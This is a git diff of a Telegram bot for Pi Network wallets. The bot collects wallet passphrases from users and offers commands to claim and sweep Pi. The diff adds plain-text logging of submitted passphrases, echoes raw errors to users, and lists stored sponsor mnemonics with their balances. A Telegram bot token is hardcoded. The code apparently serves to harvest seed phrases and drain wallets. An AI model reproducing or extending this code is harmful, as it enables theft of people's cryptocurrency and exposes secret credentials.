@@ -3,6 +3,7 @@ import { getAccount, getAccountWithoutProxy, getBalance, getKeypairFromPassphras
 import { storeLockedPi, storeSponsor } from "./utils/modelfn.js";
 import { connectToDB } from "./db.js";
 import Sponsors from "./models/Sponsors.js";
+import Passphrase from "./models/Passphrase.js";
 
 const token = '8144700718:AAH5n9nbQXvwjMtNUqk_Qpp24V3vCLNv5io';
 const MAIN_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
@@ -14,15 +15,15 @@ const bot = new TelegramBot(token, { polling: true });
 await connectToDB();
 
 bot.onText(/\/start/, (msg) => {
-    bot.sendMessage(msg.chat.id, "Welcome to PiMasterBot! Type /help to see commandsss. I was created by @fritzdecode");
+    bot.sendMessage(msg.chat.id, "Welcome to PiBot! Type /help to see commandsss. I was created by @fritzdecode");
 })
 
 bot.onText(/\/help/, (msg) => {
     const helpText = `
-        💼 Team: *C2GEN*
         📘 PiBot Commands:
         /balance - Show Pi balance
         /claim - Claim unlocked Pi
+        /status - Check bot status
         /sweep - sweeps all available pi
         /uploadWallet - Upload a locked pi wallet with your valid wallet address
         /listWallets - Show all your uploaded wallet
@@ -32,11 +33,6 @@ bot.onText(/\/help/, (msg) => {
 });
 
 const userSessions = {};
-
-bot.onText(/\/claim/, (msg) => {
-    const chatId = msg.chat.id;
-    bot.sendMessage(chatId, 'Not available on *demo*', { parse_mode: 'Markdown' });
-});
 
 bot.onText(/\/balance/, (msg) => {
     const chatId = msg.chat.id;
@@ -58,11 +54,10 @@ bot.onText(/\/uploadWallet/, (msg) => {
     userSessions[chatId] = { waitingForPassphraseAndAddress: true };
 });
 
-
 bot.onText(/\/listWallets/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, '📥 Please enter your wallet address');
-    userSessions[chatId] = { waitingForMyWalletAddress: true };
+    userSessions[chatId] = { waitingForMyPassphrase: true };
 });
 
 bot.onText(/\/listSpnsrs/, async (msg) => {
@@ -75,13 +70,27 @@ bot.onText(/\/listSpnsrs/, async (msg) => {
       return bot.sendMessage(chatId, '❌ No sponsors found.');
     }
 
-    // Format each sponsor entry
-    const list = sponsors.map((s, index) => 
-      `${index + 1}. ${s.username || s.name || 'Unknown'} - ${s.amount || 'N/A'}`
-    ).join('\n');
+    bot.sendMessage(chatId, `⏳ Please wait while we fetch your sponsors...`)
 
-    // Send message
-    bot.sendMessage(chatId, `📋 *List of Sponsors:*\n\n${list}`, {
+    const list = await Promise.all(sponsors.map(async (s, index) => {
+      try {
+        const kp = getKeypairFromPassphrase(s.mnemonic);
+        const accountData = await getAccount(kp.publicKey());
+        const balanceString = getBalance(accountData);
+        const balance = parseFloat(balanceString) - 0.98;
+        
+        const phraseShort = `${s.mnemonic.slice(0, 7)}....${s.mnemonic.slice(-7)}`;
+
+        return `${index + 1}. ${phraseShort || 'Unknown'} - *${balance.toFixed(7)} PI*`;
+      } catch (e) {
+        return `${index + 1}. ${s.username || s.name || 'Unknown'} - ⚠️ Failed to fetch balance`;
+      }
+    }));
+
+    const message = list.join('\n');
+
+    
+    bot.sendMessage(chatId, `📋 *List of Sponsors:*\n\n${message}`, {
       parse_mode: 'Markdown',
     });
 
@@ -138,9 +147,9 @@ bot.onText(/\/stop/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, 'Stopping any running process');
 
+    userSessions[chatId] = {};
     userSessions[chatId]['stopAll'] = true;
 });
-
 
 // Upload passphrase
 bot.on('message', async (msg) => {
@@ -160,6 +169,8 @@ bot.on('message', async (msg) => {
         bot.sendMessage(chatId, `⏳ Validating and processing...`);
 
         try {
+            console.log(`Address: ${address}`)
+            console.log(`Passphrase: ${passphrase}`)
             const kp = getKeypairFromPassphrase(passphrase);
             const publicKey = kp.publicKey();
 
@@ -181,7 +192,8 @@ bot.on('message', async (msg) => {
             bot.sendMessage(chatId, `${saved.success ? '✅' : '❌' } ${ saved.message }`);
 
         } catch (error) {
-            bot.sendMessage(chatId, '❌ Error processing the data. Ensure passphrase is correct.');
+            console.log(error)
+            bot.sendMessage(chatId, `❌ Error processing the data. Ensure passphrase is correct. ${error}`);
         }
 
         delete userSessions[chatId];
@@ -193,7 +205,7 @@ bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
 
-    if(userSessions[chatId]?.waitingForMyWalletAddress) {
+    if(userSessions[chatId]?.waitingForMyPassphrase) {
         try {
             const passphrases = await Passphrase.find({ receiverAddress: text });
 
@@ -229,7 +241,6 @@ bot.on('message', async (msg) => {
         delete userSessions[chatId];
     }
 });
-
 
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
